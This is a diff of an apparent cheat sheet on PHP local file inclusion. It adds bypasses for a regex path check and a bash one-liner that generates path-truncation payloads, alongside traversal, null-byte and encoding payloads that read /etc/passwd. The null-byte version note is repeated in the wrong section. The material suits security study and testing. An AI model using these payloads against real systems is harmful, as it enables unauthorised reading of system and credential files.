@@ -9,10 +9,24 @@ so, instead of directly using path traversal, we can prefix a `/` before our pay
 ```txt
 http://example.com/index.php?language=/../../../../etc/passwd
 ```
+### Approved Paths
+Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path. For example, the web application we have been dealing with may only accept paths that are under the `./languages` directory, as follows:
+```php
+if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
+    include($_GET['language']);
+} else {
+    echo 'Illegal path specified!';
+}
+```
+To bypass this, we may use path traversal and start our payload with the approved path, and then use `../` to go back to the root directory and read the file we specify, as follows:
+```txt
+http://example.com/index.php?language=./languages/../../../../etc/passwd
+```
 ### Null byte
 ```txt
 http://example.com/index.php?page=../../../etc/passwd%00
 ```
+> Note: Only PHP versions before 5.5 were vulnerable to Null Byte bypass.
 ### Double encoding
 ```txt
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
@@ -28,19 +42,18 @@ http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/pas
 http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
 ```
 ### Path and dot truncation
-On most PHP installations a filename longer than `4096` bytes will be cut off so any excess chars will be thrown away.
+On most PHP installations a filename longer than `4096` bytes will be cut off so any excess characters will be thrown away. it is also important to note that we would also need to start the path with a non-existing directory for this technique to work.
 ```txt
-http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
+http://example.com/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
 ```
-```txt
-http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
+
+Additionally, we can automate this using the following script:
+```bash
+echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
+non_existing_directory/../../../etc/passwd/./././<SNIP>././././
 ```
-```txt
-http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
-```
-```txt
-http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
-```
+
+> Note: Only PHP versions before 5.5 were vulnerable to Null Byte bypass.
 ### Filter bypass tricks
 ```txt
 http://example.com/index.php?page=....//....//etc/passwd
